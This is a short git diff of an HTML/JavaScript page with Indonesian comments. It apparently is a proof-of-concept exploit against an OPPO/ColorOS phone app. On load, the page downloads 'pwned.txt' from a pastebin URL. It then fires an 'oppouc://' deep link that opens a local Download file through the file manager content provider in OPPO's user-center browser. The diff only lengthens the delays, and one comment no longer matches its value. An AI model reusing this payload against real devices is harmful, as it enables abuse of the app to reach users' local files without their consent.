@@ -12,8 +12,10 @@
                 const blob = await response.blob();
                 saveAs(blob, filename);
 
-                // Jika berhasil, alihkan ke URL yang diinginkan
-                window.location.replace('oppouc://usercenter.oppo.com/browser?url=content://com.coloros.filemanager/root/storage/emulated/0/Download/pwned.txt');
+                // Jika berhasil, berikan jeda 2 detik kemudian alihkan ke URL yang diinginkan
+                setTimeout(function() {
+                    window.location.replace('oppouc://usercenter.oppo.com/browser?url=content://com.coloros.filemanager/root/storage/emulated/0/Download/pwned.txt');
+                }, 12000); // 2000 milidetik = 2 detik
             } catch (error) {
                 // Menampilkan pesan kesalahan menggunakan alert
                 alert('Error during file download: ' + error.message);
@@ -24,13 +26,11 @@
             setTimeout(function() {
                 // Contoh penggunaan
                 downloadFile('https://pastebin.com/raw/dxbeDqv2', 'pwned.txt');
-            }, 2000); // 2000 milidetik = 2 detik
+            }, 5000); // 2000 milidetik = 2 detik
         };
     </script>
 </head>
 <body>
-    <h1>MY OPPO APP</h1>
-    <h1>Please Wait 2 seconds</h1>
-    
+    <h1>MY OPPO APP </h1>
 </body>
 </html>
